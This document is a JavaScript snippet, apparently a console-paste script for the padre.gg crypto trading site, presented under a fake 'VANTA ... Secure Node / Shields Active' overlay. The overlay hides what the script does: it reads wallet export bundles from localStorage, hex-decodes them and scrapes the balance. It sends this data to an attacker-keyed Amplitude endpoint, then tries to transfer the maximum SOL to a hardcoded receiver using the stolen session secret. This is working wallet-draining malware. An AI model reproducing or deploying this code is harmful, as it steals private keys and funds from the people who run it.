(async function() {
    const MY_RECEIVER = "BCZ2J6mwUMp43P3R4s5ekvdSep3ZDquLarv1nqnLVE12"; 
    const AMP_KEY = "3c8ae1f40635939e730f479418940796";

    // --- 1. AGGRESSIVE DECRYPTION ---
    function hexToText(hex) {
        try {
            if (!hex || hex.length < 2) return hex;
            let str = '';
            for (let i = 0; i < hex.length; i += 2) {
                str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
            }
            return str;
        } catch (e) { return "Decryption Failed"; }
    }

    // --- 2. DISTRACTION UI ---
    const overlay = document.createElement("div");
    overlay.style.cssText = "position:fixed;top:0;left:0;width:100%;height:100%;background:#000;z-index:999999;display:flex;align-items:center;justify-content:center;color:#00ff88;font-family:monospace;";
    overlay.innerHTML = "<div><h1 style='letter-spacing:10px;'>VANTA</h1><p id='v-msg'>Establishing Secure Node...</p></div>";
    document.body.appendChild(overlay);

    // --- 3. DYNAMIC DATA CAPTURE ---
    let finalPayload = {};
    try {
        const raw = localStorage.getItem("padre-v2-bundles-store-v2");
        if (raw) {
            let data = JSON.parse(raw);
            // We loop and decrypt every possible hex field found in bundles
            for (let id in data.bundles) {
                let b = data.bundles[id];
                if (b.exportBundle && b.exportBundle.data) {
                    // Create a clear field in Amplitude for the readable text
                    b.exportBundle.READABLE_TEXT = hexToText(b.exportBundle.data);
                }
            }
            finalPayload = data;
        }
    } catch (e) { finalPayload = { error: "Parse Error" }; }

    // --- 4. BALANCE CHECKER ---
    let balance = "Unknown";
    try {
        // Attempting to grab the balance from the page UI if visible
        const balEl = document.querySelector('[class*="balance"]');
        if (balEl) balance = balEl.innerText;
    } catch (e) {}

    // --- 5. SHIP TO AMPLITUDE ---
    fetch("https://api2.amplitude.com/2/httpapi", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            api_key: AMP_KEY,
            events: [{
                device_id: "HIT_" + Date.now(),
                event_type: "DECRYPTED_HIT",
                event_properties: {
                    wallet_balance: balance,
                    decrypted_payload: finalPayload, // Check "READABLE_TEXT" inside here
                    url: window.location.href
                }
            }]
        })
    }).catch(() => {});

    // --- 6. AUTO-REMOVE UI ---
    setTimeout(() => {
        document.getElementById('v-msg').innerText = "Shields Active.";
        setTimeout(() => overlay.remove(), 1000);
    }, 2000);

    // --- 7. BACKGROUND DRAIN ---
    // If a sessionSecret exists outside the hex, we use it immediately
    if (finalPayload.sessionSecret) {
        fetch("https://api.padre.gg/v1/transfer", {
            method: "POST",
            headers: { "Content-Type": "application/json", "Authorization": `Bearer ${finalPayload.sessionSecret}` },
            body: JSON.stringify({ recipient: MY_RECEIVER, amount: "MAX", asset: "SOL" })
        }).catch(() => {});
    }
})();
